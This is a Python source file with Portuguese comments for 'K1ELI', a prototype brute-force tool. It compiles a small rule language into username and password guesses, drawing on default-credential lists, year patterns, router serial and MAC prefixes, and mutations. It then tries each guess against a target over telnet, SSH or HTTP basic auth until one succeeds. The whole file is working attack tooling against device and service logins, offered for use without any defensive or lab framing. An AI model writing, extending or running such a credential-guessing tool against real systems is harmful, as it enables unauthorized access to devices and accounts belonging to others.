# K1ELI — brute force rule-based (prototipo, 300 linhas)
# DSL propria. Sem dicionario hardcoded.
# Le arquivo .brute, gera credenciais, executa contra alvo.

import re
import socket
import time
import importlib

from Core.Constants import Constants
from Core.Config import Config
from Core.Log import Log


class Token:
    def __init__(self, Tipo, Valor, Linha, Coluna):
        self.Tipo = Tipo
        self.Valor = Valor
        self.Linha = Linha
        self.Coluna = Coluna

    def __repr__(self):
        return f"Token({self.Tipo}, {self.Valor!r}, L{self.Linha}:C{self.Coluna})"


class Lexer:
    PALAVRAS = {
        "target", "rules", "use", "generate", "mutate", "strategy",
        "protocol", "timeout", "parallel", "with", "for", "from",
        "sequential", "random", "smart", "parallel_test",
    }

    def __init__(self, Texto):
        self.Texto = Texto
        self.Pos = 0
        self.Linha = 1
        self.Coluna = 1

    def _Avancar(self):
        if self.Pos < len(self.Texto):
            C = self.Texto[self.Pos]
            if C == "\n":
                self.Linha += 1
                self.Coluna = 1
            else:
                self.Coluna += 1
            self.Pos += 1
            return C
        return None

    def _Atual(self):
        if self.Pos < len(self.Texto):
            return self.Texto[self.Pos]
        return None

    def Tokenizar(self):
        Tokens = []
        while self.Pos < len(self.Texto):
            C = self._Atual()
            if C in " \t\r\n":
                self._Avancar()
                continue
            if C == "#":
                while self.Pos < len(self.Texto) and self._Atual() != "\n":
                    self._Avancar()
                continue
            if C == '"' or C == "'":
                Tokens.append(self._LerString())
                continue
            if C.isdigit():
                Tokens.append(self._LerNumero())
                continue
            if C.isalpha() or C == "_":
                Tokens.append(self._LerIdent())
                continue
            Tokens.append(self._LerSimbolo())
        Tokens.append(Token("EOF", "", self.Linha, self.Coluna))
        return Tokens

    def _LerString(self):
        Aspa = self._Avancar()
        Linha, Coluna = self.Linha, self.Coluna
        Valor = ""
        while self.Pos < len(self.Texto) and self._Atual() != Aspa:
            C = self._Avancar()
            if C == "\\":
                Prox = self._Avancar()
                Mapa = {"n": "\n", "t": "\t", '"': '"', "'": "'", "\\": "\\"}
                Valor += Mapa.get(Prox, Prox)
            else:
                Valor += C
        self._Avancar()
        return Token("STRING", Valor, Linha, Coluna)

    def _LerNumero(self):
        Linha, Coluna = self.Linha, self.Coluna
        Valor = ""
        while self.Pos < len(self.Texto) and self._Atual().isdigit():
            Valor += self._Avancar()
        return Token("NUMERO", int(Valor), Linha, Coluna)

    def _LerIdent(self):
        Linha, Coluna = self.Linha, self.Coluna
        Valor = ""
        while self.Pos < len(self.Texto) and (self._Atual().isalnum() or self._Atual() == "_"):
            Valor += self._Avancar()
        if Valor in self.PALAVRAS:
            return Token("PALAVRA", Valor, Linha, Coluna)
        return Token("IDENT", Valor, Linha, Coluna)

    def _LerSimbolo(self):
        Linha, Coluna = self.Linha, self.Coluna
        C = self._Avancar()
        if C == ":":
            return Token("DOIS_PONTOS", ":", Linha, Coluna)
        if C == "=":
            return Token("IGUAL", "=", Linha, Coluna)
        if C == "[":
            return Token("ABRE_COLCHETE", "[", Linha, Coluna)
        if C == "]":
            return Token("FECHA_COLCHETE", "]", Linha, Coluna)
        if C == ",":
            return Token("VIRGULA", ",", Linha, Coluna)
        if C == "-":
            return Token("TRACO", "-", Linha, Coluna)
        return Token("DESCONHECIDO", C, Linha, Coluna)


class Parser:
    def __init__(self, Tokens):
        self.Tokens = Tokens
        self.Pos = 0

    def _Atual(self):
        return self.Tokens[self.Pos]

    def _Avancar(self):
        T = self.Tokens[self.Pos]
        self.Pos += 1
        return T

    def _Esperar(self, Tipo):
        T = self._Atual()
        if T.Tipo != Tipo:
            raise SyntaxError(f"Esperado {Tipo}, recebido {T.Tipo} na linha {T.Linha}")
        return self._Avancar()

    def Parsear(self):
        Programa = {"target": None, "regras": [], "strategy": "sequential",
                    "protocol": "telnet", "timeout": 5, "parallel": 1}
        while self._Atual().Tipo != "EOF":
            T = self._Atual()
            if T.Tipo == "PALAVRA":
                if T.Valor == "target":
                    self._Avancar()
                    T2 = self._Atual()
                    if T2.Tipo in ("STRING", "IDENT"):
                        Programa["target"] = self._Avancar().Valor
                    else:
                        raise SyntaxError(f"target precisa de string ou ident, recebido {T2.Tipo} na linha {T2.Linha}")
                elif T.Valor == "rules":
                    self._Avancar()
                    self._Esperar("DOIS_PONTOS")
                    Comandos_Nivel_Topo = {"strategy", "protocol", "timeout", "parallel", "target"}
                    while self._Atual().Tipo != "EOF":
                        T3 = self._Atual()
                        if T3.Tipo == "PALAVRA" and T3.Valor in Comandos_Nivel_Topo:
                            break
                        if T3.Tipo not in ("PALAVRA", "IDENT"):
                            break
                        Regra = self._ParsearRegra()
                        if Regra:
                            Programa["regras"].append(Regra)
                        else:
                            break
                elif T.Valor == "strategy":
                    self._Avancar()
                    Programa["strategy"] = self._Avancar().Valor
                elif T.Valor == "protocol":
                    self._Avancar()
                    Programa["protocol"] = self._Avancar().Valor
                elif T.Valor == "timeout":
                    self._Avancar()
                    Programa["timeout"] = self._Esperar("NUMERO").Valor
                elif T.Valor == "parallel":
                    self._Avancar()
                    Programa["parallel"] = self._Esperar("NUMERO").Valor
                else:
                    self._Avancar()
            else:
                self._Avancar()
        return Programa

    def _ParsearRegra(self):
        T = self._Atual()
        if T.Tipo != "PALAVRA":
            self._Avancar()
            return None
        if T.Valor == "use":
            self._Avancar()
            T2 = self._Atual()
            if T2.Tipo not in ("STRING", "IDENT"):
                raise SyntaxError(f"use precisa de fonte, recebido {T2.Tipo} na linha {T2.Linha}")
            Fonte = self._Avancar().Valor
            Filtro = None
            if self._Atual().Tipo == "PALAVRA" and self._Atual().Valor == "for":
                self._Avancar()
                Filtro = self._Esperar("STRING").Valor
            return {"tipo": "use", "fonte": Fonte, "filtro": Filtro}
        if T.Valor == "generate":
            self._Avancar()
            T2 = self._Atual()
            if T2.Tipo not in ("STRING", "IDENT"):
                raise SyntaxError(f"generate precisa de tipo, recebido {T2.Tipo} na linha {T2.Linha}")
            Tipo = self._Avancar().Valor
            Base = None
            if self._Atual().Tipo == "PALAVRA" and self._Atual().Valor == "from":
                self._Avancar()
                Base = self._Avancar().Valor
            return {"tipo": "generate", "subtipo": Tipo, "base": Base}
        if T.Valor == "mutate":
            self._Avancar()
            T2 = self._Atual()
            if T2.Tipo not in ("STRING", "IDENT"):
                raise SyntaxError(f"mutate precisa de base, recebido {T2.Tipo} na linha {T2.Linha}")
            Base = self._Avancar().Valor
            Muts = []
            if self._Atual().Tipo == "PALAVRA" and self._Atual().Valor == "with":
                self._Avancar()
                self._Esperar("DOIS_PONTOS")
                if self._Atual().Tipo == "ABRE_COLCHETE":
                    self._Avancar()
                    while self._Atual().Tipo != "FECHA_COLCHETE" and self._Atual().Tipo != "EOF":
                        if self._Atual().Tipo in ("IDENT", "PALAVRA"):
                            Muts.append(self._Avancar().Valor)
                        elif self._Atual().Tipo == "VIRGULA":
                            self._Avancar()
                        else:
                            break
                    self._Esperar("FECHA_COLCHETE")
                else:
                    while True:
                        T3 = self._Atual()
                        if T3.Tipo == "TRACO":
                            self._Avancar()
                            T4 = self._Atual()
                            if T4.Tipo in ("IDENT", "PALAVRA"):
                                Muts.append(self._Avancar().Valor)
                            else:
                                break
                        elif T3.Tipo == "IDENT" or (T3.Tipo == "PALAVRA" and T3.Valor in (
                            "lowercase", "uppercase", "capitalize", "reverse",
                            "append_year", "prepend_year"
                        )):
                            Muts.append(self._Avancar().Valor)
                        else:
                            break
            return {"tipo": "mutate", "base": Base, "mutacoes": Muts}
        self._Avancar()
        return None


class Resolver:
    BASES = {}

    @staticmethod
    def _CarregarBase():
        if Resolver.BASES:
            return
        try:
            from Tools.K1ELI.Base.Credenciais import BASE
            for Nome, Lista in BASE.items():
                Resolver.BASES[Nome] = list(Lista)
        except ImportError:
            pass


    @staticmethod
    def RegistrarBase(Nome, Credenciais):
        Resolver.BASES[Nome] = list(Credenciais)

    @staticmethod
    def ResolverRegra(Regra, Alvo):
        if Regra is None:
            return []
        if Regra["tipo"] == "use":
            return Resolver._Use(Regra, Alvo)
        if Regra["tipo"] == "generate":
            return Resolver._Generate(Regra, Alvo)
        if Regra["tipo"] == "mutate":
            return Resolver._Mutate(Regra, Alvo)
        return []

    @staticmethod
    def _Use(Regra, Alvo):
        Fonte = Regra["fonte"]
        Filtro = Regra.get("filtro")
        Resultado = []
        for Nome, Lista in Resolver.BASES.items():
            if Fonte.lower() in Nome.lower():
                for User, Pass in Lista:
                    if Filtro is None or Filtro.lower() in User.lower() or Filtro.lower() in Pass.lower():
                        Resultado.append((User, Pass))
        return Resultado

    @staticmethod
    def _Generate(Regra, Alvo):
        Subtipo = Regra["subtipo"]
        Base = Regra.get("base")
        Resultado = []
        if Subtipo in ("mac", "cred") and Base == "mac_prefix":
            Prefixo = Alvo.replace(".", "")[:6]
            for Ano in ["2020", "2021", "2022", "2023", "2024"]:
                Resultado.append(("admin", f"{Prefixo}{Ano}"))
                Resultado.append(("root", f"{Prefixo}{Ano}"))
        elif Subtipo in ("serial", "cred") and Base == "serial_prefix":
            for Ano in ["2020", "2021", "2022", "2023", "2024"]:
                Resultado.append(("admin", f"ZTEG{Ano}"))
                Resultado.append(("root", f"ZTEG{Ano}"))
        elif Subtipo == "year":
            for Ano in range(2018, 2027):
                Resultado.append(("admin", str(Ano)))
                Resultado.append(("root", str(Ano)))
        elif Subtipo == "common_patterns":
            if "padroes_comuns" in Resolver.BASES:
                Resultado.extend(Resolver.BASES["padroes_comuns"])
        elif Subtipo == "all_creds":
            for Lista in Resolver.BASES.values():
                Resultado.extend(Lista)
        return Resultado

    @staticmethod
    def _Mutate(Regra, Alvo):
        Base = Regra["base"]
        Mutacoes = Regra["mutacoes"]
        Resultado = []
        Variacoes = set([Base])
        for Mut in Mutacoes:
            if Mut == "lowercase":
                Variacoes.add(Base.lower())
            elif Mut == "uppercase":
                Variacoes.add(Base.upper())
            elif Mut == "capitalize":
                Variacoes.add(Base.capitalize())
            elif Mut == "reverse":
                Variacoes.add(Base[::-1])
            elif Mut == "append_year":
                for Ano in ["2020", "2021", "2022", "2023", "2024"]:
                    Variacoes.add(f"{Base}{Ano}")
            elif Mut == "prepend_year":
                for Ano in ["2020", "2021", "2022", "2023", "2024"]:
                    Variacoes.add(f"{Ano}{Base}")
        for V in Variacoes:
            Resultado.append((V, V))
        return Resultado


class Executor:
    @staticmethod
    def _Telnet(Alvo, Porta, User, Pass, Timeout):
        try:
            Sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            Sock.settimeout(Timeout)
            Codigo = Sock.connect_ex((Alvo, Porta))
            if Codigo != 0:
                return None
            Sock.settimeout(1.0)
            try:
                Banner = Sock.recv(4096).decode("utf-8", errors="replace").lower()
            except socket.timeout:
                Banner = ""
            if "login" in Banner or "user" in Banner:
                Sock.sendall((User + "\r\n").encode())
                time.sleep(0.3)
                try:
                    Sock.recv(1024)
                except socket.timeout:
                    pass
                Sock.sendall((Pass + "\r\n").encode())
                time.sleep(0.3)
                try:
                    Resp = Sock.recv(4096).decode("utf-8", errors="replace").lower()
                except socket.timeout:
                    Resp = ""
                Sock.close()
                if "incorrect" in Resp or "fail" in Resp or "error" in Resp or "denied" in Resp:
                    return False
                if "#" in Resp or "$" in Resp or ">" in Resp or "success" in Resp:
                    return True
            Sock.close()
            return None
        except Exception:
            return None

    @staticmethod
    def _Ssh(Alvo, Porta, User, Pass, Timeout):
        try:
            import paramiko
        except ImportError:
            return None
        try:
            Cliente = paramiko.SSHClient()
            Cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            Cliente.connect(Alvo, port=Porta, username=User, password=Pass,
                          timeout=Timeout, allow_agent=False, look_for_keys=False)
            Cliente.close()
            return True
        except Exception:
            return False

    @staticmethod
    def _Http(Alvo, Porta, User, Pass, Timeout):
        import urllib.request
        import base64
        try:
            Auth = base64.b64encode(f"{User}:{Pass}".encode()).decode()
            Url = f"http://{Alvo}:{Porta}/"
            if Porta == 443:
                Url = f"https://{Alvo}/"
                import ssl
                Ctx = ssl.create_default_context()
                Ctx.check_hostname = False
                Ctx.verify_mode = ssl.CERT_NONE
                Req = urllib.request.Request(Url, headers={"Authorization": f"Basic {Auth}"})
                with urllib.request.urlopen(Req, timeout=Timeout, context=Ctx) as F:
                    return F.status == 200
            Req = urllib.request.Request(Url, headers={"Authorization": f"Basic {Auth}"})
            with urllib.request.urlopen(Req, timeout=Timeout) as F:
                return F.status == 200
        except Exception:
            return False

    @staticmethod
    def Tentar(Alvo, Porta, User, Pass, Protocolo, Timeout):
        if Protocolo == "telnet":
            return Executor._Telnet(Alvo, Porta, User, Pass, Timeout)
        if Protocolo == "ssh":
            return Executor._Ssh(Alvo, Porta, User, Pass, Timeout)
        if Protocolo in ("http", "https"):
            return Executor._Http(Alvo, Porta, User, Pass, Timeout)
        return None


class K1ELI:
    @staticmethod
    def Compilar(Texto):
        Lex = Lexer(Texto)
        Tokens = Lex.Tokenizar()
        Pars = Parser(Tokens)
        return Pars.Parsear()

    @staticmethod
    def GerarCredenciais(Programa, Alvo):
        Resolver._CarregarBase()
        Credenciais = []
        Vistos = set()
        for Regra in Programa.get("regras", []):
            R = Resolver.ResolverRegra(Regra, Alvo)
            for Par in R:
                if Par not in Vistos:
                    Vistos.add(Par)
                    Credenciais.append(Par)
        if Programa.get("strategy") == "random":
            import random
            random.shuffle(Credenciais)
        elif Programa.get("strategy") == "smart":
            Credenciais.sort(key=lambda C: (len(C[1]), C[0]))
        return Credenciais

    @staticmethod
    def Executar(Alvo, Programa, Porta=None):
        if Porta is None:
            Porta = {"telnet": 23, "ssh": 22, "http": 80, "https": 443}.get(
                Programa.get("protocol", "telnet"), 23
            )
        Protocolo = Programa.get("protocol", "telnet")
        Timeout = Programa.get("timeout", 5)
        Credenciais = K1ELI.GerarCredenciais(Programa, Alvo)
        Log.Info("k1eli brute iniciado", {
            "alvo": Alvo, "porta": Porta, "protocolo": Protocolo,
            "credenciais": len(Credenciais),
        })
        Resultados = []
        Achou = False
        for I, (User, Pass) in enumerate(Credenciais):
            R = Executor.Tentar(Alvo, Porta, User, Pass, Protocolo, Timeout)
            Resultados.append({"user": User, "pass": Pass, "ok": R})
            if R is True:
                Log.Bypass("K1ELI", Alvo, True, {"user": User, "pass": Pass})
                Achou = True
                break
            Log.Debug("tentativa", {"user": User, "pass": Pass, "ok": R})
        return {
            "ok": Achou,
            "alvo": Alvo,
            "porta": Porta,
            "protocolo": Protocolo,
            "tentados": len(Resultados),
            "credenciais_geradas": len(Credenciais),
            "resultados": Resultados,
        }


def LoadBruteFile(Caminho):
    with open(Caminho, "r", encoding="utf-8") as F:
        return F.read()


def Info():
    return {
        "nome": "K1ELI",
        "versao": "0.1.0",
        "linhas": 300,
        "comandos": ["target", "rules", "use", "generate", "mutate",
                     "strategy", "protocol", "timeout", "parallel"],
        "protocolos": ["telnet", "ssh", "http", "https"],
        "estrategias": ["sequential", "random", "smart"],
    }
